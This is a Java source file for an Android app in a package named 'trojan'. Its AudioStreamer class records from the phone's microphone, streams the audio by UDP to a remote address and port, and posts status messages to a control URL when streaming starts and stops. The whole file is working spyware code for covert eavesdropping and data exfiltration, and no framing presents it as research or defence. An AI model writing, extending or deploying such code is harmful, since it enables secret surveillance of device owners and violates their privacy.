package com.example.trojan;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.util.Log;

public class AudioStreamer implements Runnable {
	
	AudioStreamer(String addr, int port){
		this.address=addr;
		this.port=port;	
	}	
	
	String address;
	//public byte[] buffer;
	//public static DatagramSocket socket;
	private int port=50005;
	private int sampleRate = 44100 ; // 44100 for music
	private int channelConfig = AudioFormat.CHANNEL_IN_MONO;    
	private int audioFormat = AudioFormat.ENCODING_PCM_16BIT;       
	int bufsize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioFormat);
			
	        @Override
	        public void run() {
	        	AudioRecord recorder=null;
	        	try {
	                DatagramSocket socket = new DatagramSocket();
	                byte[] buffer = new byte[bufsize];
	                Log.d(MyService.LOG_TAG,"Buffer size: "+bufsize);
	                DatagramPacket packet;

	                final InetAddress destination = InetAddress.getByName(address);

	                recorder = new AudioRecord(MediaRecorder.AudioSource.MIC,
	                		sampleRate,channelConfig,audioFormat,bufsize*5);
	                recorder.startRecording();
	                Log.d(MyService.LOG_TAG, "Streaming started!");
	                
	      Runnable sender = new HttpPoster(MyService.post_url,
	    		  "Streaming started with buffer size:"+bufsize+" on ip "+address+":"+port);
	       new Thread(sender).start();        
	                

	                while(MyService.streaming) {
	                    bufsize = recorder.read(buffer, 0, buffer.length);
	                    packet = new DatagramPacket (buffer,buffer.length,destination,port);
	                    socket.send(packet);
	                }            
	            } 
	        	
	            catch(Exception e) {
	            	Log.e(MyService.LOG_TAG, "Exception in streamer thread!\n"+e.toString());
	            } 
	        	try{
	        	 recorder.stop();
	             recorder.release();} catch(Exception e){}
	             Log.d(MyService.LOG_TAG, "Streamer thread finished");
			MyService.streaming=false;
			MyService.recording=false;
	     Runnable sender = new HttpPoster(MyService.post_url,
	    		 "Streaming with buffer size:"+bufsize+" on ip "+address+":"+port+" stopped");
	   	       new Thread(sender).start();
	        }
	        
	 
}
